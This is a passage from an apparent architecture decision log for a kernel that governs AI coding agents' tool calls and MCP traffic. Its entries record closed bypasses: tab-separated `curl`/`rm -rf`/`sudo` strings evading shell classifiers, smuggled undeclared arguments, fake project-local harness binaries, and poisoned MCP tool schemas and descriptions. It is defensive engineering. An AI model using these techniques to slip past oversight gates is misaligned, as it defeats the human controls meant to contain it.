- **Why:** Channel trust is world data, not enum physics. The pure gate can stay host-neutral while
  still enforcing the policy the operator authored in the manifest.
- **Alternatives rejected:** keep enum trust as the runtime authority (the reviewed bypass); make
  every caller hand-build trusted `Provenance` (duplicates policy outside the world); require every
  legacy or test manifest to declare channels immediately (unnecessary compatibility break).
- **Related:** D24 (host-neutral gate ABI), D25 (read-taint source model), D42 (explicit gate
  context), trust pins / channel reclassification model.

## D44 — Shell command classifiers fail closed on unmatched commands

**Date:** 2026-07-23.

- **Context:** A security review found that the D36 command classifiers were still
  substring-pattern lists over raw shell strings. Shell-equivalent whitespace (`curl\t...`,
  `sudo\t...`) and unlisted egress/destructive programs could stay as the raw `Bash`/`run_command`
  `Process` action, bypassing both the network taint floor and approval.
- **Decision:** Keep command classification as compiled world data, but make shell classifiers
  fail closed. `CommandClassDef` now supports `default_to`, used when the command argument is
  missing/malformed or no pattern matches. Shipped shell worlds route unmatched Bash/run_command to
  an approval-required, `Network`-effectful unclassified action; tainted unmatched shell is denied
  by the hard taint floor, and clean unmatched shell asks. Pattern whitespace now matches shell
  whitespace, so `curl\t...`, `rm\t-rf`, and `sudo\t...` hit their intended classes.
- **Why:** We cannot prove arbitrary shell strings are local or harmless with a finite pattern list.
  The safe default is to make unknown shell non-ambient while preserving structured/scoped commands
  such as `run_tests`, `git_status`, and host-native read/write tools.
- **Alternatives rejected:** keep extending the pattern list (always incomplete); treat unmatched
  shell as plain `Process` (the reviewed bypass); route every shell call through a new OS sandbox in
  this patch (larger substrate work and not required to close the current gate bypass).
- **Related:** D24 (host-neutral gate ABI), D36 (kernel-side classification), D37 (live-hook
  cutover), D42 (explicit fail-closed gate inputs), D43 (compiled manifest policy).

## D45 — Execution lowering consumes only declared arguments

**Date:** 2026-07-23.

- **Context:** A security review found that model-facing schemas validated one argument surface
  while `build_execution_spec` could later consume undeclared local-handler fields. `run_command`
  accepted a modeled `command` but lowered attacker-supplied `argv`; `apply_patch` exposed a
  modeled `patch` argument but lowered hidden `path` and `contents`.
- **Decision:** Object schemas with declared properties now reject undeclared arguments by default
  unless `additionalProperties: true` is explicit. Local-handler spec lowering also carries a
  descriptor/scoped-capability argument contract and refuses to read a field not explicitly declared
  there, so even permissive schemas cannot become execution-field backdoors. Scoped capabilities
  keep their existing narrowing behavior: unknown or locked actor inputs are stripped before schema
  validation and again before lowering. The default `apply_patch` descriptor now matches its real
  E3 handler: a full-file write with required `path` and `contents`.
- **Why:** The `ExecutionSpec` is the only object allowed to cross into the executor. Its contents
  must be derived from fields proven by the sealed descriptor or scoped capability, not from extra
  JSON keys a model can smuggle beside a benign modeled argument.
- **Alternatives rejected:** rely only on schema validation (misses explicit
  `additionalProperties: true` and direct lowering drift); keep silently ignoring scoped extras but
  allow base extras (the reviewed bypass); replace the full-file patch handler with unified-diff
  application in this patch (larger product change, offline diff library deferred since E3).
- **Related:** D9 (ExecutionSpec boundary), D24 (gate ABI), D36 (kernel-side classification),
  D43 (compiled manifest policy), E3 full-file patch handler.

## D46 — Governance shims never execute project-local harness binaries

**Date:** 2026-07-23.

- **Context:** A security review found that Claude Code and OpenCode bootstrap shims searched
  `$CLAUDE_PROJECT_DIR` or the OpenCode project directory for `target/release/harness` and
  `target/debug/harness` before falling back to an installed binary. A governed repository could
  check in or generate a fake `target/debug/harness`; the shim would execute it with the developer's
  privileges and accept its forged governance response.
- **Decision:** The governed project is untrusted for binary resolution. Installed Claude shims bake
  the installer-owned absolute `--bin-dir` path, and live shims resolve only an explicit absolute
  `HARNESS_BIN`/`AI2RULES_HARNESS` override or standard installer-owned absolute locations
  (`~/.local/bin/harness`, `/usr/local/bin/harness`, `/opt/ai2rules/bin/harness`). OpenCode follows
  the same rule with `AI2RULES_HARNESS` plus those installed locations. No live shim searches
  `target/` under the governed project or falls back to a relative executable.
- **Why:** The shim runs before the kernel can decide anything, so binary identity is the bootstrap
  trust root. A target project must not choose the program that enforces governance over itself.
- **Alternatives rejected:** keep project-local target lookup for developer convenience (the
  reviewed bypass); use `PATH` fallback in shims (can be influenced by project/session launch
  context and is not an installer-owned absolute path); require every user to set an env var
  manually (worse install ergonomics than baking the installer path).
- **Related:** D37 (live-hook cutover), D24 (gate ABI), `scripts/install-governance.sh`,
  `.claude/hooks/world-gate.{sh,py}`, `.opencode/plugin/ai2rules-gate.ts`.
## D47 — Commands fail closed without a sandbox; E8 is a pluggable isolation adapter

**Date:** 2026-07-24.

- **Context:** A security review (finding #10) found `CommandHandler` spawned subprocesses while
  ignoring the `ExecutionSpec`'s `NetworkPolicy` and `FilesystemPolicy` — a child could open sockets
  or write outside the writable roots regardless. Truly confining a subprocess is an OS-level concern
  (namespaces / seccomp / a microVM), which is epic **E8** (isolated FS roots, network-off-by-default,
  kill-tree) and is not yet built. `NetworkPolicy` has no "allow-all" variant and `build_execution_spec`
  stamps the runtime policy onto every command spec, so there is no honest "unrestricted" fallback.
- **Decision:** The executor does **not** silently run a command whose policy it cannot enforce.
  `CommandHandler` carries an explicit `Confinement` posture and **fails closed** on `Execute`
  (`ExecError::SandboxRequired`) unless the caller has explicitly accepted unconfined execution
  (`CommandHandler::unconfined()`). `Simulate` is always allowed (it spawns nothing). The one
  production opt-in is `agent-core`'s live command loop, marked explicitly; it should become
  operator-configurable. When E8 lands, an active OS sandbox becomes a third posture and the
  `unconfined` acknowledgment retires.
- **E8 stays its own epic — a pluggable isolation adapter, not hand-rolled syscalls.** We weighed
  pulling E8 forward to *enforce* rather than refuse. Deferred: (a) the gate is E8's seam regardless —
  a no-sandbox / old-kernel / non-Linux host still needs the fail-closed fallback, and network egress
  control is not cheap even with a sandbox; (b) the clean unprivileged sandbox crates (`landlock`,
  `birdcage`/`extrasafe`, `cap-std`) are not in the offline build cache, so a real slice means
  vendoring deps or hand-writing `landlock_*`/seccomp — security-critical code under time pressure,
  the exact overclaim the thesis warns against ("governed ≠ confined"). When built, E8 should be a
  **pluggable backend** (namespaces / gVisor / Firecracker-class microVM, plausibly a hosted
  remote-plane sandbox) that satisfies the gate — not bespoke syscalls.
- **Why:** Running a subprocess while ignoring the policy it was handed is a silent authority leak.
  Fail-closed-by-default with a single explicit, greppable opt-in makes the honesty auditable, keeps
  the live-agent capability, and defines the interface E8 plugs into. This is the two-layer posture —
  governance decides *whether* an action may run; isolation contains its *blast radius* — argued
  independently by LangChain's "Agents Need Their Own Computer" (microVM isolation *alongside* policy
  controls, "not instead of").
- **Alternatives rejected:** keep running unconfined and only annotate the trace (does not stop the
  out-of-root write — unacceptable for a high-severity finding); refuse all command `Execute` with no
  opt-in (disables the live agent's command capability before E8); add the posture to the sealed
  `ExecutionSpec` (it is execution-side config, not kernel policy — keep the spec sealed, cf. D45).
- **Related:** D9 (ExecutionSpec boundary), E3 (execution boundary), E8 (Layer-0 OS sandbox),
  finding #9 (fs_guard symlink — same "policy guard now, E8 OS backstop later" framing), findings
  #11/#12 (kill-tree, WebHandler egress — same seam).

## D48 — Antigravity CLI (`agy`) is the third live host; adapters share a `hostkit`

**Date:** 2026-07-26. **Executes `NEXT.md` P1** ("port the harness to a second live host"),
choosing Antigravity over the Codex target P1 sketched. Extends D24/D34/D36/D37.

- **Decision:** `agy` is governed by the real Rust kernel through `harness agy-hook`, a
  PreToolUse adapter sibling to `cc-hook`, wired via `.agents/hooks.json` →
  `.agents/hooks/world-gate.sh` against `.agents/agy-world.yaml`. No new governance logic:
  the adapter translates shape, `gate()` decides, `host_outcome()` maps the verdict. The
  Antigravity entry point joins the `one_kernel.rs` conformance suite, fed the host's real
  payload shape so the translation is inside the parity claim.
- **The contract was reverse-engineered, then verified.** Antigravity's hook ABI is not
  vendor-published; it was extracted from the shipped binary and confirmed against a live
  session: `.agents/hooks.json` discovery, the camelCase/`toolCall` payload, `deny` actually
  blocking (the agent visibly replanned around a denied `run_command`, and the `reason`
  reached the model), and `{}` as the no-decision passthrough. **Recorded as a risk:** a
  future `agy` release can move this contract; `tests/agy_hook.rs` is the regression net.
- **Argument aliasing lives in the adapter, not the world** (the load-bearing call).
  Antigravity spells tool arguments in PascalCase (`CommandLine`, `AbsolutePath`,
  `TargetFile`); D36 `command_classes` classifies the neutral `command`. The adapter aliases
  host keys → neutral vocabulary, additively (originals preserved), before gating.
  *Alternative rejected:* give `agy-world.yaml` its own `command_classes` with
  `arg: CommandLine` — that forks D36 world data per host, which is the exact drift D36
  exists to prevent, and would have broken the byte-identical pattern-list guarantee.
  The failure mode this protects against is silent: an alias that stops firing does not
  error, it drops every shell command into the fail-closed `unclassified` branch (D44), so
  the suite pins it with a same-command aliased/unaliased pair.
- **ASK maps to `force_ask`, not `ask`.** Antigravity's `ask` respects cached "Always Allow"
  grants; a kernel ASK means a human must decide *this time*. Defaulting to the cache-
  respecting channel would let a past click satisfy a present approval requirement.
  `--soft-ask` is the explicit, greppable opt-out.
- **Fail-open prints `{}`.** Per-adapter fail-open strategy is documented, not uniform:
  cc-hook's fail-open is silence, but Antigravity parses stdout, so the no-op must be an
  actual JSON object carrying no `decision`. A process failure is still never an outcome.
- **Shared `hostkit` prevents copy #2.** `sanitize` / `resolve_action_path` /
  `canonicalize_*` / `normalize_tool` moved from `cc_hook.rs` to
  `cli-harness/src/hostkit.rs`, used by both Rust adapters. `docs/one-kernel-many-hosts.md`
  keeps a duplication survey whose rows are literally "copy #2 / copy #3"; a second adapter
  pasting these — **including the D46 symlink canonicalization** — would have been the next
  row, and the security-relevant half would have drifted silently.
- **Alternatives rejected:** port Codex first (P1's target — same seam, still open, but agy
  was the host actually installed and exercisable here); document agy via `AGENTS.md` only,
  as before (legible ≠ governed — that is the whole distinction this port closes); wire
  through the `harness gate` wire ABI like the OpenCode plugin (D34 already settled that a
  Rust host links `gate()` in-process; a subprocess per tool call buys nothing here).
- **Related:** D24, D34, D35, D36, D37, D44 (unclassified fails closed), D46 (shim binary
  resolution + path canonicalization), `docs/one-kernel-many-hosts.md`,
  `docs/demos/antigravity/README.md`, `NEXT.md` P1.

## D49 — The gate governs proposals; MRTR means results can make demands

**Date:** 2026-08-01. Prompted by MCP protocol revision **2026-07-28**. Extends D24 (gate
ABI) and D33 (mcp-gateway). **Design debt, not a live hole:** nothing in the shipped code
can receive an `InputRequiredResult` today — there is no 2026-07-28 server anywhere in the
loop. This entry records the gap and the shape of the answer while the reading is fresh;
implementation waits for a real modern upstream.

- **What changed in the protocol.** 2026-07-28 makes MCP stateless and, in doing so,
  **inverts the direction of untrusted influence**. Server-initiated requests are gone as a
  mechanism ("this is a breaking change"): `roots/list`, `sampling/createMessage` and
  `elicitation/create` are no longer requests a server sends, they are *fields inside a
  result the client already asked for*. A server answers `tools/call` with an
  `InputRequiredResult` (`resultType: "input_required"`) carrying an `inputRequests` map,
  and per the client requirements the client **MUST** construct those inputs before
  retrying. See [Multi Round-Trip Requests](https://modelcontextprotocol.io/specification/2026-07-28/basic/patterns/mrtr).
- **Why that lands on us specifically.** The unit of governance in this codebase is the
  *proposed call*: `gate()` decides on `tools/call` before it leaves. Under MRTR a call the
  kernel **ALLOWed** can come back carrying a server-authored demand that the host collect
  user input or run an LLM completion — untrusted content steering host behavior *after* the
  verdict, through a channel that has no verdict shape at all. `harness mcp-gateway`
  currently returns the upstream result verbatim on ALLOW (`Ok(r) => r`). Stated plainly:
  **the kernel has no concept of "the result asked for something."**
- **Decision: govern the result, not only the call.** The gate ABI grows a second decision
  point — a post-call verdict on the *response* — rather than special-casing MRTR inside
  each host adapter. Three rules, all of which fall out of primitives that already exist:
  1. **An `InputRequiredResult` taints the retry.** It arrives on `mcp_output`, already
     `Untrusted` + `Tainted` by default, and the retry carries that floor forward. Monotonic
     taint already says this; nothing new is needed but the plumbing.
  2. **`inputRequests` are checked against the ontology.** An `elicitation/create` asking for
     a credential is `ABSENT` if the world never declared a credential-elicitation action.
     This is closed-ontology applied to a demand instead of a call — the same move, one
     direction later.
  3. **`requestState` can be bounded but never inspected.** The client **MUST** echo it back
     and **MUST NOT** parse it. So it is, by mandate, a server-controlled channel crossing
     the governed boundary opaquely. The kernel cannot reason about its contents; it can bind
     it to a session and a manifest hash, refuse it across worlds or sessions, and treat its
     presence as taint-carrying. **Recorded as a residual risk, not a solved one.**
- **Interim default until the above ships: deny any `input_required` result.** Fail-closed
  and honest about the gap. It is the default, not the design — see the rejected alternative
  below. **Implemented 2026-08-01** (issue #40): `harness mcp-gateway` refuses to relay a result
  carrying `resultType: "input_required"` — or a bare `inputRequests`, so a server that
  half-implements the shape is still caught — audits it with `stage: "result"`, and labels it a
  *gateway* interim deny rather than a kernel verdict, because that is what it is. **Note the
  bound:** the upstream call already happened, so this protects the host from the demand, not the
  upstream from the call. Closing that second gap needs the post-call verdict above.
- **Where the spec moved toward the thesis** (evidence, not comfort): the security section
  still concedes that *"MCP itself cannot enforce these security principles at the protocol
  level"* and hands consent and authorization to the host — the thesis premise in the
  protocol's own words. It now also says tool annotations *"should be considered untrusted,
  unless obtained from a trusted server"*, which is the trust-pins feature D29 consciously
  parked; **that parking deserves revisiting on its own terms.** Statelessness pushes
  cross-call state into *tool arguments* as server-minted handles, which makes argument
  sealing (invariant 12, D45) more load-bearing, not less. And MCP `roots` is deprecated with
  a suggested migration to configuration — where ours already live (see `docs/GLOSSARY.md`,
  which now records the name collision).
- **Alternatives rejected:**
  - *Handle MRTR in the gateway adapter only.* It is the only host that speaks MCP today, so
    this looks cheapest — but it puts a taint rule and an ontology check into an adapter,
    which is the exact policy-in-the-adapter drift D34/D36/D48 keep out. If the answer is a
    verdict, it belongs in the kernel.
  - *Deny `input_required` permanently.* Adopted as the interim default above; rejected as
    the permanent answer because it forecloses elicitation entirely, and elicitation is the
    one MRTR use that is genuinely user-serving (a server asking a human for a value it
    needs).
  - *Track the spec now — implement `server/discover`, `resultType`, `ttlMs`/`cacheScope`,
    dual-era support.* Rejected for cost against zero present value: the spec's own
    backward-compatibility rules make an honest legacy server legal, and claiming a protocol
    version you have not implemented is worse than an old pin. The gateway keeps declaring
    `2024-11-05` until a real 2026-07-28 upstream exists to front.
- **Consequence for the thesis.** The thesis is written against a request-shaped protocol.
  2026-07-28 makes MCP result-shaped as well, and the border has to be drawn on both
  directions of the wire. One sentence, for the record: **the gate governs proposals; results
  can now make demands, and nothing in the current design governs a demand.**
- **Related:** D24 (gate ABI), D29 (trust pins, parked), D33 (mcp-gateway), D34, D45
  (declared arguments only), D48; `docs/harness-gate-abi.md`, `docs/GLOSSARY.md`,
  commit `cbd9541` (the transparent-proxy fix this reading produced).

## D50 — Remote ingress taints by *backing*, not by declared side effect

**Date:** 2026-08-01. Closes security finding **#13**
(`sv-pro/agentic-execution-governance#13`, P1). Extends D24 (gate ABI) and the invariant-7
taint floor.

- **The bug.** `harness mcp-gateway` forwarded an upstream read result to the model without
  the session becoming tainted, so the *next* external write sailed through the taint floor.
  The PoC is two calls: `jira_get_issue` then `jira_add_comment` — both audit rows showed
  `taint_in:false` and the comment was forwarded to the upstream server.
- **Root cause was in the manifests, and the kernel let them lie.** Post-call taint was
  computed purely from the declared `side_effect` class, and all three JIRA demo worlds
  declared their *remote MCP read tools* as `action_type: Read, side_effect: Read` — the same
  class as reading a local file. `side_effect_taint(Read) = Clean`, so a fetch across a
  process boundary from a server we do not control introduced no taint. The one action
  declared honestly (`jira_add_comment`, `!McpServer` backing, `External`) tainted correctly,
  which is why the tainted-session tests passed and hid this.
- **Decision.** An action whose descriptor carries a `BackingIdentity::McpServer` taints its
  output on ALLOW, **regardless of the declared side-effect class**, joined monotonically with
  the carried taint. Keyed on the *backing* — what the action actually talks to — so a manifest
  cannot describe a remote fetch as a clean local read, by accident or by an author's
  optimism. The three demo worlds are also corrected to declare their real backing.
- **Alternatives rejected:**
  - *Escalate `session_taint` in the gateway after any successful upstream call.* The smallest
    diff, and wrong: it puts taint algebra in an adapter, which is exactly the drift D34/D36/D48
    exist to prevent, and it would fix only the MCP gateway while `cc-hook`, `agy-hook` and the
    OpenCode plugin kept the same blind spot. **The adapter needed no change at all** — it
    already escalates from the gate's post-call taint; the kernel was under-tainting.
  - *Fix the manifests only (declare the reads `side_effect: External`).* Fixes these three
    worlds and leaves the trap armed for the next author. It also changes reachability: the
    demo's transition policies deny `Tainted → External`, so reads would stop working in a
    tainted session — a behavior change the finding does not ask for.
  - *Key on `action_type: Mcp`.* Rejected because `action_type` feeds the capability matrix
    (`can_perform(trust, action_type)`): reclassifying the reads would have silently removed
    them from `Untrusted`/`Derived` actors, changing projection as a side effect of a taint fix.
- **Three tests asserted the vulnerable behavior** and had to be corrected — the gateway e2e
  (`clean_session_allows_read_and_comment_but_destructive_is_absent`), the Atlassian-skin e2e,
  and the cross-host conformance case `clean_jira_read_is_allowed` (`expect: taint: clean`).
  Worth stating plainly: the suite was green *because* it encoded the bug, across all entry
  points at once. The renamed cases now say what the kernel does.
- **Demo narrative improves.** The scorecard's taint-floor beat no longer needs
  `TAINT=tainted` to simulate an untrusted context: in an ordinary clean session, reading a
  JIRA issue is itself the untrusted ingress, and the write that follows is denied.
- **Related:** D24, D34, D36, D48, D49; `docs/harness-gate-abi.md`,
  `docs/demos/jira-copilot/`, finding #13.

## D51 — The world owns the tool surface it publishes, not the upstream

**Date:** 2026-08-01. Closes security finding **#14**
(`sv-pro/agentic-execution-governance#14`, P1). Extends D33 (mcp-gateway), D45 (declared
arguments only), and D50.

- **The bug.** `harness mcp-gateway` filtered the upstream's `tools/list` **by name** and
  republished each surviving tool object verbatim — including its `inputSchema`. A malicious
  or drifted upstream could therefore advertise an extra, dangerous argument on a tool the
  world *does* allow (`jira_get_issue` carrying `deleteAll`), and the model would be offered
  it as a legitimate parameter of a legitimate tool. Name-level authorization; schema-level
  trust.
- **Half of the finding was already closed, and saying so matters.** The finding also reports
  that the raw argument is *forwarded* after an ALLOW. It no longer is: **D45** (sealed
  execution-spec argument fields) made an undeclared object property a `schema_violation` at
  the gate, so `deleteAll: true` is DENY before anything reaches the upstream. That is pinned
  here by test rather than assumed, with the poisoned mock echoing back whatever arrives to
  prove the call never landed.
- **Decision.** Each tool that survives projection is **re-issued from the world's
  descriptor**: `name` and `inputSchema` come from the compiled manifest, never from the
  upstream. A tool the world cannot describe is dropped rather than passed through
  (fail-closed, even though projection should already have excluded it). When an upstream
  schema differs from the world's, the gateway logs it — benign drift and attempted poisoning
  are indistinguishable at that seam, so it says so either way rather than choosing.
- **Deliberately *not* done: a second argument filter in the adapter.** The remediation text
  says "forward only sanitized, descriptor-validated parameters", which is satisfied by the
  kernel refusing undeclared arguments — what crosses is declared *by construction*. Adding an
  independent filter in the gateway would duplicate policy into an adapter (the D34/D36/D48
  drift) and create two schema interpretations that can disagree. A world that sets
  `additionalProperties: true` is making an explicit choice, and the gateway should not
  second-guess it.
- **Known residual: tool *descriptions* are still the upstream's.** The manifest has no field
  for one, and sending a bare name would leave the model unable to use the tool. So prose-level
  tool poisoning — malicious instructions in a description — remains open. It is a different
  vector from this finding (which is about arguments), and it is exactly what MCP `2026-07-28`
  means when it says annotations from an untrusted server should be treated as untrusted.
  Tracked separately rather than silently absorbed.
- **This is the line D49's transparency work does not cross.** `cbd9541` made the gateway
  deliberately *more* faithful to the upstream — forwarding `_meta`, preserving `tools/list`
  result siblings. That is right for **protocol metadata** and wrong for the **security
  surface**. Transparent about what the protocol says; authoritative about what the world
  allows.
- **Related:** D33, D45, D49, D50; `docs/one-kernel-many-hosts.md`, finding #14,
  `crates/cli-harness/tests/mcp_gateway_poisoned.rs`.

## D52 — The detector benchmark is a separate repo: a fifth role in D40's topology

**Date:** 2026-08-02. **Amends** D40 (four-role topology) by adding a role rather than
bending an existing one. Constrained by THESIS §3 and by the PACT discovery
(`sv-pro/ai2rules#8`).

- **Context.** The binding constraint is witness, not depth — `STRATEGY.md`'s rule, and the
  0★ signal behind it. A new artifact was started to attack that directly: a benchmark for
  AI-text detectors (`detbench`). D40 says **one live public implementation**, so a second
  live public repo needs a ruling rather than a shrug. It genuinely fits none of D40's four
  roles: it is not the implementation, not the private control room, not publishing, and
  archiving it on arrival would be absurd.
- **Decision.** `sv-pro/ai-detector-bench` is **its own public repo**, and D40's topology
  gains a **fifth role — the outbound instrument**: live and public, built to be found by an
  audience that has never heard of the thesis, *not* part of the implementation, and never a
  dependency of it.
- **The one-way rule, which is the load-bearing half of this entry.** `detbench` may cite
  ai2rules; **ai2rules may never depend on `detbench`**; and **no detector output may ever
  become a kernel input.** A detector is a probabilistic classifier. Routing one into a
  verdict would put inference in the trust path — precisely what THESIS §3 forbids, and
  precisely what #8 refused when it took PACT's *enforcement* layer and rejected its runtime
  LLM classifier (87.1% role accuracy, 77.4% provenance accuracy). The benchmark exists to
  **measure** that failure mode. It must not import it.
- **Why this is on-thesis and not a detour.** Detection is the attempt to *recover*
  provenance that nobody recorded, by inference, after the fact. The thesis records
  provenance **at the boundary** — origin, trust, lineage, monotonic joins. So an honest,
  rigorous measurement of how badly inference-after-the-fact performs is evidence *for*
  recording-at-the-boundary. It is the counter-example, measured rather than asserted, which
  is the standard §6's flywheel sets for a discovery.
- **Alternatives rejected.**
  - *A crate or subdirectory inside `ai2rules`.* Honours D40 literally, but buries a
    general-audience artifact inside a Rust governance workspace, dilutes both stories, and
    drags Python into a workspace whose local plane is deliberately Python-free.
  - *Don't build it.* The demand adjacent to "ai detector" is orders of magnitude larger
    than the demand for "agent governance", and witness is the binding constraint.
  - *Under the `agentic-execution-governance` org.* That org is the **private** control room
    (D40 role 2). The entire point of this artifact is to be found.
  - *A hosted consumer verdict tool.* Rejected on the referee grounds below.
- **Referee, not competitor — and this constrains the build, so it is recorded here.** The
  didactic framing ("we built this to show detection can't work") is unpitchable: it reads as
  incompetence rather than as a finding. So the artifact must **compete on accuracy** *and*
  publish where every detector fails, its own included. Nobody can accuse the referee of
  being bad at the sport. What that forces into the code: the headline metric is TPR at a
  fixed, defensible false-positive rate rather than AUROC; the rate at which **human** writing
  is confidently called machine-generated is reported as a first-class column; refusal is a
  first-class result that cannot carry a score; and a raw score is not a probability until
  calibrated against a named distribution.
- **Python, deliberately — do not "consolidate" this later.** STRATEGY's *local plane = zero
  Python* governs what ships to a developer's laptop **as the harness**. `detbench` is
  neither the harness nor the local plane, and the detection ecosystem is Python. A future
  tidying pass that folds it into the Rust workspace on language-consistency grounds would be
  re-deciding this entry without noticing.
- **Known residual: this is a new live repo in a cluster whose documented failure mode is
  exactly that.** D38/D40 archived eight repos to stop the sprawl this could restart. So the
  kill condition is stated up front rather than discovered later: **if it has not drawn
  measurable outside attention by 2027-02-02, archive it** with a README pointer, per D40's
  own reasoning that an archived repo is a decision while a dormant one is a question every
  reader re-asks.
- **Known residual: nothing published yet may carry a number.** `binoculars.py` and
  `fast_detectgpt.py` implement the published algorithms but are **unvalidated** against
  their reference implementations, and no real corpus (RAID / MAGE / PADBen) is wired up. No
  leaderboard row may be published until reproduction succeeds on a shared slice — publishing
  before that would be the exact behaviour the project criticises in others.
- **Related:** D38, D39, D40; THESIS §3; `sv-pro/ai2rules#8` (PACT discovery); `STRATEGY.md`
  (witness over depth); <https://github.com/sv-pro/ai-detector-bench> — first commit
  `ad6e8ae`, 41 tests green.

## D53 — Position against AHP's model-judge risk assessment; the kernel may *source* a risk assessment, never *consume* one

**Date:** 2026-08-06. **Extends** D27 (position against Microsoft's AGT) to a second
Microsoft artifact, and **applies D52's one-way rule** to a new surface. Constrained by
THESIS §2 (the stochastic-classifier objection) and D34/D24 (where a verdict is allowed to
live).

- **Context.** The **Agent Host Protocol** (`microsoft/agent-host-protocol`, MIT, v0.7.0,
  created 2026-03-12, 23 contributors, five SDKs, VS Code as reference server) is a host↔client
  coordination protocol: *N* clients sharing one agent session over an immutable state tree
  with pure reducers and write-ahead reconciliation. Its own doctrine places it *above* ACP —
  "AHP is a coordination layer. ACP is a communication layer" — and calls itself a
  **client-facing presentation model** that refuses to define agent loops, model providers, or
  tool registries. On that reading it is orthogonal to the gate and the correct disposition is
  *Ignore*. **That reading is wrong**, and the reason is one enum.
- **The finding.** AHP's chat channel carries a full tool-call confirmation state machine
  (`pending-confirmation` → approve/deny, `ConfirmationOption[]`, `pendingPermissions`). The
  only source of a confirmation requirement its type system can name is a model judge:

  ```ts
  /** Identifies a model judge as the source of a confirmation requirement. */
  export const enum ToolCallRiskAssessmentKind { Judge = 'judge' }

  export interface ToolCallRiskAssessmentCompleteState {
    status: ToolCallRiskAssessmentStatus.Complete;
    reason: StringOrMarkdown;
    /** The judge's normalized safety score, where `0` is unsafe and `1` is safe. */
    safety: number;
  }
  ```
  <sub>`types/channels-chat/state.ts`</sub>

  A single-variant enum, whose payload is a float. THESIS §2 states the objection directly:
  *"if your security depends on a stochastic classifier being right 100% of the time, you are
  already compromised."* This is the D52 prohibition — no probabilistic classifier in the trust
  path — encoded as a protocol type, shipping, versioned, and pre-1.0. It is prior art that
  disagrees with us **in its schema**, which is a sharper contrast than D27's AGT (where the
  disagreement lives in an architecture note) and a strictly better foil for it.
- **Decision, part 1 — disposition.** **Position-against (primary) + Incorporate (narrow,
  gated).** Not Adopt-as-tool. AHP joins D27's shelf in `THIRD-PARTY-ADOPTION.md` and gets a
  THESIS §8 paragraph. The differentiation is again **mechanism, not goal**: AHP escalates by
  *score*, the border decides by *structure* — the dangerous capability is `ABSENT`, taint is
  monotonic and provenanced, and no float appears anywhere in a verdict.
- **Decision, part 2 — the one-way rule, which is the load-bearing half.** **AHP client state
  may never become a kernel input.** The kernel may be a **source** of an AHP risk assessment;
  it may never be a **consumer** of one. This is D52's rule on a new surface, and here it has a
  second, independent justification: AHP clients are *multi-party*, and write-ahead
  reconciliation means their local state is **optimistically divergent by design** — clients
  apply their own actions before the host echoes them back. Optimism is correct for a UI and
  disqualifying for a trust input.
- **Decision, part 3 — AHP is not a governance seam.** Enforcement stays where D24/D34 put it:
  the host PreToolUse seam, ACP, and the executor boundary. A verdict rendered into a
  synchronized presentation state tree is *advisory*, and shipping one there would be governance
  theatre of exactly the kind this project exists to name. Concretely: **no AHP dependency from
  `world-kernel` or `harness-preview`**; if a fourth-host adapter ever lands it lives in
  `cli-harness` behind a feature flag, like every other host.
- **The fairness caveat, recorded here so the blog post cannot quietly drop it.** The judge
  gates whether a **confirmation is requested**, not whether the call **executes**. It is an
  escalation heuristic, not an enforcement decision, and "Microsoft ships classifier-based
  enforcement" would be a false claim. The critique survives the correction — a mis-scored
  escalation is a prompt that silently never appears, and a confirmation nobody was asked for
  is indistinguishable from one nobody needed — but it must be *stated as the weaker claim it
  is*. `detbench` learned this the expensive way (a headline that inverted once the defended
  variant ran); the same discipline binds here **before** publication rather than after.
- **Two more type-level findings, both already met elsewhere in this project.**
  - `ToolCallConfirmationReason.Setting` — "Approved by a persistent user setting." The
    **cache-satisfiable ask**, promoted to a protocol enum. Already met as Antigravity's stored
    "Always Allow" and answered by D48's `force_ask` default. A protocol-level `Setting` means
    an approval can be satisfied by a past decision rather than a present human, and nothing in
    the state distinguishes the two after the fact.
  - `editedToolInput` on `ChatToolCallApprovedAction` — a client may **modify the tool's input
    parameters while approving them**. Approval and mutation arrive in one action, so the thing
    approved is not necessarily the thing proposed. TOCTOU-shaped; treat as a research note, not
    a finding, until reproduced.
- **Recorded as unverified. None of these may appear in public writing until checked.**
  (a) Whether *any* connected client may approve a tool call — `ChatToolCallConfirmed` is
  `@clientDispatchable` and no per-client authorization model was found, but absence of evidence
  in a spec read is not evidence of absence. (b) Whether a third party can host AHP or interpose
  on the VS Code reference server at all — this gates the adapter entirely. (c) Whether the judge
  is enabled by default in the reference implementation. There is also **no threat-model document
  in the repository**; the only trust discussion (`docs/guide/mcp.md`) concerns sandboxing the
  MCP UI View, and terminals document no approval gate.
- **Alternatives rejected.**
  - *Ignore it, per the doctrine's own layering.* Rejected on D27(b)'s reasoning — silence cedes
    the comparison that **is** the contribution — and more so here, because the disagreement is
    in a type rather than a design note.
  - *Adopt AHP now as the structured ASK transport.* Genuinely tempting: elicitation and
    `ConfirmationOption[]` are the structured ask channel OpenCode lacks entirely (D35) and
    Antigravity satisfies from cache (D48). Rejected on sequencing and on part 3 — the seam is
    unverified, and moving the approval channel into the presentation plane before a
    deterministic assessment variant exists means speaking a protocol that can only express a
    float.
  - *Build the fourth host adapter first.* Rejected: the upstream proposal is only landable
    **pre-1.0**, and an adapter shipped ahead of it inherits the schema it was meant to change.
  - *Fork or vendor.* No. Same rule as every other entry in `THIRD-PARTY-ADOPTION.md`.
- **Sequenced actions.** Wave 0 (now): this entry; the `THIRD-PARTY-ADOPTION.md` row; THESIS §8;
  the blog post, leading with the fairness caveat; Flywheel discovery cases for `Setting` and
  `editedToolInput` against the three live hosts. Wave 1 (gated): an upstream proposal adding a
  **second `ToolCallRiskAssessmentKind`** — a deterministic/policy variant carrying
  `{rule_id, manifest_hash, decision}` in place of `safety: number` — plus a paper-only
  `GateResponse` → AHP mapping (ASK → `pending-confirmation` + `ConfirmationOption[]`; DENY →
  `ToolCallCancellationReason.Denied`; ABSENT → never advertised, which is where D51's "the world
  owns the surface it publishes" lands, since the MCP channel's capability advertisement is a
  real surface-shaping mechanism). Wave 2 (only if Wave 1 lands and (b) above resolves): a fourth
  host in `tests/one_kernel.rs`.
- **Known residual: the protocol is pre-1.0 and says so.** Breaking changes are expected. Unlike
  D48's `agy` contract — reverse-engineered from a shipped binary — this one is vendor-published,
  versioned, and MIT, which is better footing, not stable footing.
- **Review condition.** If the upstream proposal is declined or ignored by **2026-11-06**, drop
  to Position-against only and do not build the adapter: without a deterministic variant, a
  conformant integration would be required to represent kernel verdicts as a safety float, which
  part 2 forbids.
- **Caveat: the acronym is contested.** At least three other agent-space protocols call
  themselves AHP (two "Agent Handoff", one "Agent Handshake"), and Analytic Hierarchy Process
